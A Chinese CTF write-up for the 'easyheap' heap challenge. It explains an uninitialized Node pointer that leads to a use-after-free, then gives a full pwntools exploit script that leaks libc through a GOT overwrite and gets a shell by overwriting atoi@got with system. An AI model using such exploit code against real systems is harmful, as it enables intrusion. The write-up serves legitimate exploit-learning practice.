# easyheap

题目一个ELF文件和一个libc.so.6，首先patch一下。然后DUMP了。。不过赛后我又换回老得的ubuntu快照，所以不需要patch了。

**这次看了两题，都是没有输出函数的，。。其实还没怎么做过这种heap题。**

主要解决方案有三种

- 通过got表覆盖来leak，这个比较传统。但是要求不能开PIE(easy heap)
- 通过IO FILE来leak地址（wooden house）
- 不泄露地址，使用低地址爆破（参考house of roman）

比赛时候没找到漏洞点。。没仔细看存放指针的结点，直接错过了漏洞。。不过这个部分其实挺难审的，一点也不easy。

漏洞主要来自对存放分配对象的ptr数组未初始化。

ptr指向一个Node结点，内部杰哥分别是指向data的content和存储数据的size。

```c++
struct Node {
  char *content;
  int size;
};
```

在创建数组的过程中，如果申请超过1024大小的空间，程序在为Node创建空间后却没有对ptr进行初始化。我们申请的Node的地址空间是上一次free Node留下的。由于content中会存有fastbin链（指向另一个free chunk）。那么虽然我们的Node未初始化，这个Node也会指向一个content。此时如果这个content可控，我们也就能实现一个UAF。

```c++
int sub_4008F1()
{
  void **v1; // rbx
  signed int i; // [rsp+8h] [rbp-18h]
  int nbytes; // [rsp+Ch] [rbp-14h]

  for ( i = 0; ptr[i]; ++i )
    ;
  if ( i > 2 )
    return puts("Too many items!");
  ptr[i] = malloc(0x10uLL);
  puts("How long is this message?");
  nbytes = sub_400890();
  if ( nbytes > 1024 ) //如果大于1024，不会对ptr[i]进行初始化
    return puts("Too much size!");
  *((_DWORD *)ptr[i] + 2) = nbytes;
  v1 = (void **)ptr[i];
  *v1 = malloc(nbytes);
  puts("What is the content of the message?");
  read(0, *(void **)ptr[i], (unsigned int)nbytes);
  return puts("Add successfully.");
}
```

***Demo***

实现任意地址（0x603060）写

```python
malloc(0x18,"A"*0x10)
free(0)				#留下content

malloc_large() #未初始化漏洞，获取一个指向free chunk的指针
malloc(0x18,"B"*0x10) #malloc 这个free chunk

edit(0,"C"*0x10+p64(0x603060))#修改新Node的content
edit(1,"DDDD")			#任意地址写
```

因为没开PIE所以直接改GOT表

![CgXZVW](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/CgXZVW.png)

因为程序同时最多拥有三块内存在ptr，所以需要构造三个连续的chunk，先通过后两个chunk进行got表覆盖和地址泄漏（需要free掉第三个chunk），最后在用前两个chunk，完成对atoi函数的写入。

```python
#!/usr/bin/python
from pwn import *

p=process({"./easyheap"})
elf=ELF("./easyheap")
context.log_level='Debug'
gdb.attach(p)

def malloc(size,data):
	p.recvuntil("Your choice:")
	p.sendline(str(1))
	p.recvuntil("How long is this message?")
	p.sendline(str(size))
	p.recvuntil("What is the content of the message?")
	p.sendline(data)

def malloc_large():
	p.recvuntil("Your choice:")
	p.sendline(str(1))
	p.recvuntil("How long is this message?")
	p.sendline(str(1025))


def free(index):
	p.recvuntil("Your choice:")
	p.sendline(str(2))
	p.recvuntil("What is the index of the item to be deleted?")
	p.sendline(str(index))
	
def edit(index,data):
	p.recvuntil("Your choice:")
	p.sendline(str(3))
	p.recvuntil("What is the index of the item to be modified?")
	p.sendline(str(index))
	p.recvuntil("What is the content of the message?")
	p.send(data)

#UAF

malloc(0x18,"A"*0x10)
free(0)
malloc_large()
malloc(0x18,"a"*0x10)
free(1)
malloc_large()
malloc(0x18,"B"*0x10)

edit(1,"C"*0x10+p64(0x602018)) #free_got
edit(2,p64(elf.plt['puts']))

edit(1,"C"*0x10+p64(elf.got['puts']))

free(2) #leak puts

p.recvuntil("\n")
puts_addr=u64(p.recv(6).ljust(8,"\x00"))
offset=0x2a300
system_addr=puts_addr-offset
print "[*]puts="+hex(puts_addr)
print "[*]system="+hex(system_addr)

edit(0,"A"*0x10+p64(elf.got['atoi']))
edit(1,p64(system_addr))

p.recvuntil("Your choice:")
p.sendline("/bin/sh")

p.interactive()
```

![7alh2c](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/7alh2c.png)



***小结一下***

漏洞点：未初始化Node，导致的UAF

利用方面：

- GOT表覆盖atoi来getshell
- 构造三个连着的Node结点（因为ptr限制）

还是代码审计能力太垃圾了。。。诶